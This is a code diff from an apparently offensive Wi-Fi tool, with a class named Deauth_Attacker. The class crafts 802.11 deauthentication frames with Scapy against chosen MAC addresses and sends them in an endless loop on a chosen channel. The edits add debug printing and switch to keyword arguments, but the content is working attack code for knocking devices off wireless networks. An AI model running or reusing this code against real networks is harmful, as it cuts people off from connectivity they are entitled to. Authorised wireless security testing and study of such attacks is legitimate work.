@@ -267,6 +267,7 @@ class Deauth_Attacker():
         
         for reason in reasons:
             packet = Dot11(addr1=mac_dst, addr2=mac_src, addr3=mac_src) / Dot11Deauth(reason=reason)
+            console.print(packet)
             pkts.append(packet)
 
         
@@ -280,7 +281,7 @@ class Deauth_Attacker():
 
 
         while True: 
-            sendp(pkts, inter, loop, count, verbose, realtime, iface); console.print(f"[bold green][+] Packets sent")
+            sendp(x=pkts, inter=inter, loop=loop, count=count, verbose=verbose, realtime=realtime, iface=iface); console.print(f"[bold green][+] Packets sent")
             
             if not inter and not loop: time.sleep(1)
 
@@ -309,7 +310,7 @@ class Deauth_Attacker():
         verbose = Variables.verbose
         
 
-        Background_Threads.channel_hopper(set_channel=channel)
+        Background_Threads.channel_hopper(set_channel=channel); console.print(channel)
 
         pkts = Deauth_Attacker._craft_packet(mac_src=mac_src, mac_dst=mac_dst, reasons=reasons)
         Deauth_Attacker._sender(pkts=pkts, iface=iface, inter=inter, loop=loop, count=count, realtime=realtime,verbose=verbose)
